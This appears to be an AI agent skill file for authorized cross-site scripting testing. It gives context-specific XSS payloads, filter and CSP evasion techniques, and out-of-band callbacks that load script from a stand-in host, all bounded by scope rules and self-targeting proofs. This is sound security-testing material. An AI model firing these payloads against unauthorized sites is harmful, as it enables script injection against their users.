---
name: xss-testing
description: "Invoke this skill when testing an authorized endpoint/parameter for cross-site scripting (coverage class `xss`): reflected, stored, and DOM-based, with context-aware payloads (HTML body, attribute, JS, URL, CSS) and filter/CSP evasion. Covers detection, context identification, a bounded proof (a controlled alert/DOM change or out-of-band callback), then recording the result (report_finding when confirmed)."
---

# XSS Testing (coverage class: `xss`)

> **Platform note (hainguyen0207):** this skill comes from a variant with an exploit-coverage matrix. This platform has
> no `record_coverage_cell` / `record_methodology_gap` tools. Wherever the text says to record or close a matrix
> "cell" (one endpoint × parameter), follow **Recording the result** below instead: `report_finding` for a
> confirmed issue, otherwise a per-parameter test summary in your result. `traffic_ref` = the request ids you get
> from `traffic_search` (the recording proxy). Destructive steps are gated by the platform's red-set sign-off.

A per-class testing playbook that turns one `(endpoint, param)` cell of the
exploit-coverage matrix from `untested` into `tested`, `finding`, or a proven
`n/a`. It is the hunting detail behind the matrix: send attempts through the
recording proxy, read where and how input is reflected, adapt to the context,
and record the trail. Use it alongside `api-security` (which maps where
parameters live and how they are rendered) — this skill decides whether a given
input reaches an HTML/JS sink the browser will execute.

Attribution: adapted from the `xss-testing` skill of
[AntiFox-AI/antifox](https://github.com/AntiFox-AI/antifox) (AGPL-3.0). Rewritten
in English, gated for authorized engagements, and bound to the coverage matrix;
no source was copied verbatim.

## Boundaries

- Authorized scope only. The endpoint must be in the task's scope; never pivot to
  a host or parameter the engagement did not authorize.
- Non-destructive by default. Detection and confirmation use a self-contained,
  self-targeting proof — `alert(document.domain)`, a benign DOM change, or a
  callback to your own out-of-band host. Never craft a payload aimed at real users
  (cookie/session exfil to an attacker host, keyloggers, forced navigation, forged
  login forms, worm-style stored propagation). Those cross the line and require the
  operator's sign-off (the red-set gate), not your own decision.
- Stored XSS: inject only into a field you (a test account/resource) will render,
  prove execution to *you* and no one else, and remove or flag the stored entry
  when the engagement allows. Do not plant a payload on a page real users load.
- Proof, not exfiltration. Confirm with the minimum: a controlled `alert`/`print`
  of `document.domain`, a single out-of-band hit, or one benign DOM mutation. Do
  not harvest cookies, tokens, or other users' data.
- Every claim needs a replayable artifact: the exact request, the exact response
  (the reflected markup) or the captured out-of-band interaction, in the
  recording proxy.

## Method

Work one parameter at a time. Baseline first, identify the context precisely,
then prove execution with the smallest payload that fits that context.

### 1. Reach and baseline
- Submit a unique, inert marker (e.g. `bcpenZZQ9`) and search the response, other
  pages, and the DOM for it — is it reflected (reflected/DOM) or stored and later
  rendered (stored)? A parameter never rendered into a page is a candidate `n/a`
  once you have shown it reaches no HTML/JS sink.
- Record the normal response and the exact bytes around the reflection, so every
  later payload is judged against a real baseline.

### 2. Detection (read-only)
- Send an inert metacharacter probe and see which survive unencoded:
  `bcpenZZQ9"'<>` (plus `` ` `` `{ } / =` as the context suggests). Note which are
  returned raw vs HTML-entity-encoded (`&lt; &quot;`) — that reveals the sink and
  encoding boundary without firing anything.
- For DOM XSS, read the client JS: find sources (`location`, `location.hash`,
  `document.referrer`, `postMessage`, `name`) flowing to sinks (`innerHTML`,
  `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `setTimeout`,
  `Function`, `el.src`/`href`, jQuery `.html()`). The fragment (`#…`) never leaves
  the browser, so test it live in a controlled tab.

### 3. Context identification
Pick the payload shape from where the marker lands:
- **HTML body/text**: tags are live. `<svg onload=alert(document.domain)>` or
  `<img src=x onerror=alert(document.domain)>` (avoids a `</script>` that may be
  stripped).
- **HTML attribute** (inside `"…"`/`'…'`): break out — `"><svg onload=alert(document.domain)>`;
  if the quote holds but the tag allows it, inject a handler:
  `" autofocus onfocus=alert(document.domain) x="`.
- **Unquoted attribute**: a space plus a handler — ` onmouseover=alert(document.domain) `.
- **Inside a `<script>` / JS string**: close the string/statement —
  `';alert(document.domain)//`, or `</script><svg onload=…>` when the tag is reachable.
- **URL context** (`href`/`src`/`window.location`): `javascript:alert(document.domain)`.
- **CSS / style context**: not directly executable in modern browsers (legacy
  `expression()` aside); treat as `n/a` for script execution with the reason noted.

### 4. Bounded confirmation
- Fire the smallest payload that proves execution *to you*: `alert(document.domain)`
  (or `print()`, which survives some anti-alert framework hooks) confirming the
  origin, or a benign `document.title='bcpenZZQ9'` DOM change you can read back.
- Blind/stored where you cannot see the render: use an out-of-band callback you
  control — Burp Collaborator or your own DNS/HTTP listener — e.g.
  `<script src=//ID.oob.example/x></script>` or `<img src=//ID.oob.example/x>`,
  and confirm from the captured interaction, not from a guess.
- Stop at proof. One execution or one out-of-band hit is enough; do not escalate
  to data theft or user-targeted payloads.

### 5. Filter / WAF / CSP adaptation
- Record exactly what the filter does (strips `<script>`? encodes `"`? drops
  `on*`?), then try context-appropriate, in-scope evasions: tag/handler variety
  instead of `<script>` (`<svg>`, `<img>`, `<details open ontoggle=…>`,
  `<iframe srcdoc=…>`); case/whitespace variation and split or no-quote handlers;
  alternate encodings matched to the sink (HTML entities `&#x61;…`, URL, JS
  escapes) only where the decoder runs before the sink.
- Against a CSP, check for a bypass that is itself the finding: a permissive
  `script-src` (`unsafe-inline`, `unsafe-eval`, a wildcard or JSONP/`strict-dynamic`
  host you can abuse), a missing `object-src`/`base-uri`, or a reflected value
  inside an allowed inline context. A payload blocked by a strong CSP is a
  reflection that does not execute — worth recording, not yet a proven `n/a`.

## Recording the result

Record every `xss` outcome so nothing is lost and nothing is re-tested:
- **Confirmed** - call `report_finding` with the exact replayable request and response (cite the proxy request
  ids from `traffic_search`), the injection point/context, and the demonstrated impact. The reporter agent then
  writes the full report; do not exaggerate severity beyond what you proved.
- **Tested, not vulnerable** - in your result, list each (endpoint, parameter) you tested for `xss`, the payload
  families tried, the app's reaction to each, the follow-ups those reactions prompted, and why you stopped. A
  single bare payload on a reachable parameter is NOT "tested" - adapt to what the response tells you.
- **Not applicable** - only with a proven reason the class cannot apply here (shown by evidence), never an
  assumption from the endpoint's name.

Reading source code or a config is not testing: a negative claim must rest on real requests sent through the
recording proxy.

## Tools

| Tool | Use | Notes |
|---|---|---|
| recording proxy + curl | submit payloads, capture request/reflected response for `traffic_ref` | always available |
| browser / headless browser | confirm DOM execution and fragment-based DOM XSS the proxy cannot show | controlled, self-targeted tab |
| out-of-band listener (own DNS/HTTP, or Burp Collaborator when wired) | confirm blind/stored execution | only your own callback host, in scope |
| Burp (MCP, when connected) | Repeater/Intruder for iterative payloads, Collaborator for OOB | only where a Burp instance is wired |
| dalfox | automated XSS detection/parameter analysis | NOT installed by default — verify (`command -v dalfox`) before use; if absent, use the manual method and record the attempts. When present, keep it in scope and non-destructive: no user-targeted exfil payloads, point blind callbacks only at your own host. |

## Completion self-check

- [ ] Every `tested`/`finding` cell cites a real proxy request (`traffic_ref`) sent
      during this task, not a source read.
- [ ] The reflection context was identified and the payload matched it; evidence
      shows the probe/encoding reasoning, not one bare payload.
- [ ] Confirmation used a self-targeted proof (`alert(document.domain)` / benign
      DOM change / own OOB hit); no cookie, token, or other-user data was taken.
- [ ] No user-targeted or worm-style stored payload was planted; any test entry
      is on a test resource and was cleaned up or flagged.
- [ ] Any `n/a` cites evidence that input is encoded at every context and reaches
      no JS sink, not an assumption.
